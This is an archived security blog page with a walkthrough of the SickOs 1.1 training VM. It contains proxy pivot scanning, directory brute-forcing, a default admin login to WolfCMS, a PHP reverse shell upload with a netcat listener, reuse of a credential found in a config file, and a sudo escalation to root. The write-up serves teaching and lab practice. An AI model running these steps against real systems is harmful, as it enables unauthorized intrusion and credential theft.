@@ -1,0 +1,758 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>SickOs 1.1 writeup - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="SickOs 1.1 writeup">
+  <meta name="keywords" content="sickos, sickos 1.1 walkthrough, sickos 1.1, sickos 1.1 solution, sickos 1.1 writeup, vulnhub, dirb, dirb kali, dirb tutorial">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/where-to-start">Where to start</a></li>
+  <li><a href="/book-corner">Book corner</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">SickOs 1.1 writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-06-28T15:09:14+03:00" pubdate data-updated="true">Jun 28<span>th</span>, 2017</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Today&rsquo;s target is similar to what can be found in OSCP labs. The goal is to obtain root privileges and get the flag. Let&rsquo;s dive right in!</p>
+
+<!-- more -->
+
+
+<h2>Recon</h2>
+
+<p>Nmap results are:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -p- -A 192.168.217.143
+</span><span class='line'>
+</span><span class='line'>PORT     STATE  SERVICE    VERSION
+</span><span class='line'>22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>| ssh-hostkey: 
+</span><span class='line'>|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
+</span><span class='line'>|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
+</span><span class='line'>|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
+</span><span class='line'>3128/tcp open   http-proxy Squid http proxy 3.1.19
+</span><span class='line'>| http-open-proxy: Potentially OPEN proxy.
+</span><span class='line'>|_Methods supported: GET HEAD
+</span><span class='line'>|_http-server-header: squid/3.1.19
+</span><span class='line'>|_http-title: ERROR: The requested URL could not be retrieved
+</span><span class='line'>8080/tcp closed http-proxy</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is an interesting one, there are no obvious points of entry, but there is a Squid proxy in place. Navigating directly to port 3128 didn&rsquo;t yield anything besides an error of an invalid URL request. I googled the Squid version and found a potentially useful <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning">Metasploit module</a>:</p>
+
+<blockquote><p>A misconfigured Squid proxy can allow an attacker to make requests on his behalf. This may give the attacker
+information about devices that he cannot reach but the Squid proxy can. For example, an attacker can make requests
+for internal IP addresses against a misconfigurated open Squid proxy exposed to the Internet, therefore performing an
+internal port scan. The error messages returned by the proxy are used to determine if the port is open or not. Many
+Squid proxies use custom error codes so your mileage may vary. The open_proxy module can be used to test for open
+proxies, though a Squid proxy does not have to be open in order to allow for pivoting (e.g. an Intranet Squid proxy
+which allows the attack to pivot to another part of the network).</p></blockquote>
+
+<p>Here are the options I&rsquo;ve used for the scanner:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(squid_pivot_scanning) &gt; options
+</span><span class='line'>
+</span><span class='line'>Module options (auxiliary/scanner/http/squid_pivot_scanning):
+</span><span class='line'>
+</span><span class='line'>   Name          Current Setting                                  Required  Description
+</span><span class='line'>   ----          ---------------                                  --------  -----------
+</span><span class='line'>   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
+</span><span class='line'>   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
+</span><span class='line'>   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
+</span><span class='line'>   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
+</span><span class='line'>   RANGE         192.168.217.143                                  yes       IPs to scan through Squid proxy
+</span><span class='line'>   RHOSTS        192.168.217.143                                  yes       The target address range or CIDR identifier
+</span><span class='line'>   RPORT         3128                                             yes       The target port (TCP)
+</span><span class='line'>   SSL           false                                            no        Negotiate SSL/TLS for outgoing connections
+</span><span class='line'>   THREADS       1                                                yes       The number of concurrent threads
+</span><span class='line'>   VHOST                                                          no        HTTP server virtual host</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(squid_pivot_scanning) &gt; run
+</span><span class='line'>
+</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 21 is CLOSED
+</span><span class='line'>[+] [192.168.217.143] 192.168.217.143:80 seems OPEN
+</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 139 is CLOSED
+</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 445 is CLOSED
+</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 1433 is CLOSED
+</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 1521 is CLOSED
+</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 1723 is CLOSED
+</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 3389 is CLOSED
+</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 8080 is CLOSED
+</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 9100 is CLOSED
+</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
+</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It appears port 80 is open on the target. I configured my browser to use the Squid proxy and went to the web server:</p>
+
+<p><img class="center" src="/images/pentest/sickos/1-web.png" title="web server" alt="webpage"></p>
+
+<p>If it doesn&rsquo;t appear there is much content on the web server, we have to get more information by force _;) Since I had to take the proxy into consideration, I preferred a CLI tool rather than a GUI like Dirbuster. How fortunate that there is a CLI companion to Dirbuster, called <em>sound of drums</em>: <strong>dirb</strong>!</p>
+
+<h3>dirb description</h3>
+
+<p>Homepage: <a href="http://dirb.sourceforge.net/">http://dirb.sourceforge.net/</a></p>
+
+<blockquote><p>DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web
+Objects. It basically works by launching a dictionary based attack against
+a web server and analizing the response.</p>
+
+<p>DIRB comes with a set of preconfigured attack wordlists for easy usage but
+you can use your custom wordlists. Also DIRB sometimes can be used as a
+classic CGI scanner, but remember is a content scanner not a vulnerability scanner.</p>
+
+<p>DIRB main purpose is to help in professional web application auditing.
+Specially in security related testing. It covers some holes not covered by
+classic web vulnerability scanners. DIRB looks for specific web objects that
+other generic CGI scanners can&rsquo;t look for. It doesn&rsquo;t search vulnerabilities
+nor does it look for web contents that can be vulnerables.</p></blockquote>
+
+<h3>dirb options</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-----------------
+</span><span class='line'>DIRB v2.22    
+</span><span class='line'>By The Dark Raver
+</span><span class='line'>-----------------
+</span><span class='line'>
+</span><span class='line'>./dirb &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]
+</span><span class='line'>
+</span><span class='line'>========================= NOTES =========================
+</span><span class='line'> &lt;url_base&gt; : Base URL to scan. (Use -resume for session resuming)
+</span><span class='line'> &lt;wordlist_file(s)&gt; : List of wordfiles. (wordfile1,wordfile2,wordfile3...)
+</span><span class='line'>
+</span><span class='line'>======================== HOTKEYS ========================
+</span><span class='line'> 'n' -&gt; Go to next directory.
+</span><span class='line'> 'q' -&gt; Stop scan. (Saving state for resume)
+</span><span class='line'> 'r' -&gt; Remaining scan stats.
+</span><span class='line'>
+</span><span class='line'>======================== OPTIONS ========================
+</span><span class='line'> -a &lt;agent_string&gt; : Specify your custom USER_AGENT.
+</span><span class='line'> -c &lt;cookie_string&gt; : Set a cookie for the HTTP request.
+</span><span class='line'> -f : Fine tunning of NOT_FOUND (404) detection.
+</span><span class='line'> -H &lt;header_string&gt; : Add a custom header to the HTTP request.
+</span><span class='line'> -i : Use case-insensitive search.
+</span><span class='line'> -l : Print "Location" header when found.
+</span><span class='line'> -N &lt;nf_code&gt;: Ignore responses with this HTTP code.
+</span><span class='line'> -o &lt;output_file&gt; : Save output to disk.
+</span><span class='line'> -p &lt;proxy[:port]&gt; : Use this proxy. (Default port is 1080)
+</span><span class='line'> -P &lt;proxy_username:proxy_password&gt; : Proxy Authentication.
+</span><span class='line'> -r : Don't search recursively.
+</span><span class='line'> -R : Interactive recursion. (Asks for each directory)
+</span><span class='line'> -S : Silent Mode. Don't show tested words. (For dumb terminals)
+</span><span class='line'> -t : Don't force an ending '/' on URLs.
+</span><span class='line'> -u &lt;username:password&gt; : HTTP Authentication.
+</span><span class='line'> -v : Show also NOT_FOUND pages.
+</span><span class='line'> -w : Don't stop on WARNING messages.
+</span><span class='line'> -X &lt;extensions&gt; / -x &lt;exts_file&gt; : Append each word with this extensions.
+</span><span class='line'> -z &lt;milisecs&gt; : Add a miliseconds delay to not cause excessive Flood.
+</span><span class='line'>
+</span><span class='line'>======================== EXAMPLES =======================
+</span><span class='line'> ./dirb http://url/directory/ (Simple Test)
+</span><span class='line'> ./dirb http://url/ -X .html (Test files with '.html' extension)
+</span><span class='line'> ./dirb http://url/ /usr/share/dirb/wordlists/vulns/apache.txt (Test with apache.txt wordlist)
+</span><span class='line'> ./dirb https://secure_url/ (Simple Test with SSL)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This tool is exactly what I needed! And it finished really fast! Here are its discoveries:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dirb http://192.168.217.143 /usr/share/wordlists/dirb/common.txt -p 192.168.217.143:3128
+</span><span class='line'>
+</span><span class='line'>-----------------
+</span><span class='line'>DIRB v2.22    
+</span><span class='line'>By The Dark Raver
+</span><span class='line'>-----------------
+</span><span class='line'>
+</span><span class='line'>START_TIME: Thu Jun 29 06:45:12 2017
+</span><span class='line'>URL_BASE: http://192.168.217.143/
+</span><span class='line'>WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
+</span><span class='line'>PROXY: 192.168.217.143:3128
+</span><span class='line'>
+</span><span class='line'>-----------------
+</span><span class='line'>
+</span><span class='line'>GENERATED WORDS: 4612                                                          
+</span><span class='line'>
+</span><span class='line'>---- Scanning URL: http://192.168.217.143/ ----
+</span><span class='line'>+ http://192.168.217.143/cgi-bin/ (CODE:403|SIZE:291)                                                                                               
+</span><span class='line'>+ http://192.168.217.143/connect (CODE:200|SIZE:109)                                                                                                
+</span><span class='line'>+ http://192.168.217.143/index (CODE:200|SIZE:21)                                                                                                   
+</span><span class='line'>+ http://192.168.217.143/index.php (CODE:200|SIZE:21)                                                                                               
+</span><span class='line'>+ http://192.168.217.143/robots (CODE:200|SIZE:45)                                                                                                  
+</span><span class='line'>+ http://192.168.217.143/robots.txt (CODE:200|SIZE:45)                                                                                              
+</span><span class='line'>+ http://192.168.217.143/server-status (CODE:403|SIZE:296)                                                                                          
+</span><span class='line'>                                                                                                                                                    
+</span><span class='line'>-----------------
+</span><span class='line'>END_TIME: Thu Jun 29 06:45:16 2017
+</span><span class='line'>DOWNLOADED: 4612 - FOUND: 7</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Quite interesting. Some resources are forbidden, connect is a Python script with the following content:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python
+</span><span class='line'>
+</span><span class='line'>print "I Try to connect things very frequently\n"
+</span><span class='line'>print "You may want to try my services"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The robots.txt file seems the most useful:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
+</span><span class='line'>Disallow: /
+</span><span class='line'>Dissalow: /wolfcms</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A hidden CMS, eh? I went there to find this:</p>
+
+<p><img class="center" src="/images/pentest/sickos/1-wolfcms.png" title="wolfcms" alt="wolfcms"></p>
+
+<p>I ran Nikto on it, didn&rsquo;t find anything interesting besides an outdated Apache version. Same with other scanners and another round of directory bruteforcing, nothing useful. I googled for WolfCMS, and found an arbitrary file upload exploit, but it required an authenticated user. So next I searched for the admin interface, and found an answer on <a href="https://www.wolfcms.org/forum/topic2034.html">their forums</a>. So I appended <em>?admin</em> to the path and got redirected to <a href="http://192.168.217.143/wolfcms/?/admin/login">http://192.168.217.143/wolfcms/?/admin/login</a></p>
+
+<p><img class="center" src="/images/pentest/sickos/1-login.png" title="wolfcms admin" alt="wolfcms admin login"></p>
+
+<p>I couldn&rsquo;t find default credentials, no obvious SQL errors, so I tried a few common combinations, and imagine the surprise when <em>admin:admin</em> worked!</p>
+
+<p><img class="center" src="/images/pentest/sickos/1-admin.png" title="admin" alt="wolfcms admin panel"></p>
+
+<h2>Exploitation</h2>
+
+<p>Now I can use the <a href="https://www.exploit-db.com/exploits/36818/">exploit</a>. The vulnerability exists in the CMS&#8217; File Manager, which doesn&rsquo;t restrict the types of files that can be uploaded. But I forgot that I had to access the CMS through a proxy, and didn&rsquo;t want to modify the code, so instead I manually uploaded Pentestmonkey&rsquo;s reverse shell through the interface:</p>
+
+<p><img class="center" src="/images/pentest/sickos/1-file.png" title="file manager" alt="wolfcms file upload"></p>
+
+<p>I set up a Netcat listener and navigated to the shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -vnlp 8888
+</span><span class='line'>listening on [any] 8888 ...
+</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 33709
+</span><span class='line'>Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
+</span><span class='line'> 18:12:38 up  3:14,  0 users,  load average: 0.00, 0.01, 0.05
+</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
+</span><span class='line'>$ whoami
+</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I looked inside the web directory and found a <strong>config.php</strong> file in <code>/var/www/wolfcms</code> that contained a set of credentials:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>// Database settings:
+</span><span class='line'>define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
+</span><span class='line'>define('DB_USER', 'root');
+</span><span class='line'>define('DB_PASS', 'john@123');</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I also noted the existence of a sickos user, based on the home directories. Tried SSH&#8217;ing as root, no joy. But trying as sickos with the above password worked! Inside sickos&#8217; home, I noticed a bash_history file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sickos@SickOs:~$ cat .bash_history 
+</span><span class='line'>sudo su
+</span><span class='line'>exit</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Woot, could it be that easy? I did a <code>sudo -l</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>User sickos may run the following commands on this host:
+</span><span class='line'>    (ALL : ALL) ALL</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Root was only a <em>sudo su</em> away!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@SickOs:~# whoami
+</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the flag:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt 
+</span><span class='line'>If you are viewing this!!
+</span><span class='line'>
+</span><span class='line'>ROOT!
+</span><span class='line'>
+</span><span class='line'>You have Succesfully completed SickOS1.1.
+</span><span class='line'>Thanks for Trying</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Thanks D4rk for an interesting machine, with a nice twist of Squid!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> ___________________________________
+</span><span class='line'>&lt; You will outgrow your usefulness. &gt;
+</span><span class='line'> -----------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-06-28T15:09:14+03:00" pubdate data-updated="true">Jun 28<span>th</span>, 2017</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2017/06/27/dnsmap-kali-linux-tools/" title="Previous Post: dnsmap - Kali Linux tools">&laquo; dnsmap - Kali Linux tools</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2017/06/30/wafw00f-kali-linux-tools/" title="Next Post: wafw00f - Kali Linux tools">wafw00f - Kali Linux tools &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>whoami</h1>
+  <p>switch (interests){<br>
+ case INFORMATION SECURITY:<br>
+Mostly offensive security, but trying to be well-rounded in everything;<br>
+case PYTHON:<br>
+Mainly security and sysadmin related scripting;<br>
+case LINUX:<br>
+Greetings from /dev/null;<br>
+case JAPANESE:<br>
+Language, anime, samurai;<br>
+case MARTIAL ARTS:<br>
+If it's fighting I like it;<br>
+case MILITARY SCIENCE:<br>
+Ancient, medieval, modern;<br>
+default: GAMING;}</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/11/30/getting-in-the-w1r3s/">Getting in the W1R3S</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/16/hackfest-2016-sedna/">Hackfest 2016: Sedna</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/11/social-engineering-expert-course-review/">Social Engineering Expert course review</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/10/take-the-spydersec-challenge/">Take the SpyderSec Challenge</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/10/26/all-your-64base-are-belong-to-us/">All your 64Base are belong to us</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+	    skip_repos: [ "chousensha.github.io" ],
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+  </ul>
+  
+    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
+  
+</section>
+
+<section>
+  <h1>Blogroll</h1>
+  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
+  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
+  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
+  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
+  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
+  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
+  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
+  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
+  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
+  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
+</section>
+
